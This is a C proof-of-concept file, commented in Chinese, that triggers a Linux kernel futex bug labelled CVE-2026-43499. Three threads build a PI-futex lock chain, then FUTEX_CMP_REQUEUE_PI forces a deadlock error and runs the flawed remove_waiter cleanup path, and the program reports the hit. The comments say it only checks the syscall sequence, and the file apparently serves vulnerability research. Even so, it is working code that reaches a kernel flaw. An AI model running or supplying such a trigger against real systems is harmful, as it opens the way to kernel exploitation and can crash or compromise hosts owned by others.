/* P2.3 触发器 v1：命中 CVE-2026-43499 的 remove_waiter(current) 路径
 * 拓扑：A 持有 u3；B 持有 u2 且阻塞在 u3；A 在 u1 上 WAIT_REQUEUE_PI(u2)；
 *       C 执行 CMP_REQUEUE_PI(u1→u2) → 链走 B→u3→owner=A==top_task → -EDEADLK
 *       → rt_mutex_start_proxy_lock 失败路径 → remove_waiter(lock, waiter) 操作 current(C)
 * 预期：C 返回 -EDEADLK(35)，A 超时返回 -ETIMEDOUT(110)。
 * 只做 syscall 序列验证，不做任何利用动作。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>

#define FUTEX_WAIT 0
#define FUTEX_WAKE 1
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
                 uint32_t *u2, uint32_t val3) {
    return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static uint32_t u1 = 0;   /* 源 futex（A 睡眠处），值必须为 0 */
static uint32_t u2 = 0;   /* requeue 目标，B 持有 */
static uint32_t u3 = 0;   /* A 持有，B 阻塞于此 */

static volatile int a_started = 0, b_locked_u2 = 0;
static int a_ret = 999, a_errno = 0;
static int b_lock_u3_ret = 999;

/* A：先 LOCK_PI(u3) 持有它，然后在 u1 上 WAIT_REQUEUE_PI 指向 u2，带 300ms 超时 */
static void *thread_a(void *arg) {
    int r = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[A] LOCK_PI(u3) = %d, u3=0x%08x (mytid=%d)\n", r, u3, (int)syscall(SYS_gettid));
    a_started = 1;

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;                 /* 1500ms: +1s 且 nsec+500ms，保持规范值 */
    ts.tv_nsec += 500 * 1000 * 1000;
    while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }

    /* 睡在 u1，被 requeue 到 u2（此时应命中死锁检测） */
    r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
    a_errno = errno;
    a_ret = r;
    printf("[A] WAIT_REQUEUE_PI(u1->u2) = %d (errno=%d %s)\n", r, a_errno, r ? strerror(a_errno) : "ok");
    printf("[A] after: u1=0x%08x u2=0x%08x u3=0x%08x\n", u1, u2, u3);
    return NULL;
}

/* B：LOCK_PI(u2) 持有 u2，然后 LOCK_PI(u3) 阻塞（owner=A），pi_blocked_on 挂在 u3 */
static void *thread_b(void *arg) {
    int r = futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[B] LOCK_PI(u2) = %d, u2=0x%08x (mytid=%d)\n", r, u2, (int)syscall(SYS_gettid));
    b_locked_u2 = 1;

    /* 阻塞：A 持有 u3 */
    b_lock_u3_ret = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[B] LOCK_PI(u3) = %d (返回说明已被唤醒), u3=0x%08x\n", b_lock_u3_ret, u3);
    if (b_lock_u3_ret == 0) futex(&u3, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    futex(&u2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== trigger start (pid=%d) ===\n", getpid());

    pthread_t ta, tb;
    /* 关键顺序：A 先持有 u3 并睡在 u1，B 再锁 u2、阻塞于 u3 */
    pthread_create(&ta, NULL, thread_a, NULL);
    while (!a_started) usleep(1000);
    usleep(150000);              /* 让 A 真正进入 futex_wait_requeue_pi 睡眠 */

    pthread_create(&tb, NULL, thread_b, NULL);
    while (!b_locked_u2) usleep(1000);
    usleep(200000);              /* 让 B 进入 u3 阻塞（pi_blocked_on 建立） */

    printf("[C] 状态: u1=0x%08x u2=0x%08x u3=0x%08x\n", u1, u2, u3);
    /* C：触发 requeue_pi，期望 -EDEADLK */
    int r = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
    int e = errno;
    printf("[C] CMP_REQUEUE_PI(u1->u2, nr=1, expect=0) = %d (errno=%d %s)\n",
           r, e, r < 0 ? strerror(e) : "ok");
    printf("[C] %s\n", (r < 0 && e == 35) ? "*** HIT: -EDEADLK => vulnerable remove_waiter path executed ***"
                                      : "(未命中 EDEADLK)");

    pthread_join(ta, NULL);
    printf("=== trigger end ===\n");
    _exit(0);   /* B 仍在 u3 阻塞，直接退出进程 */
}
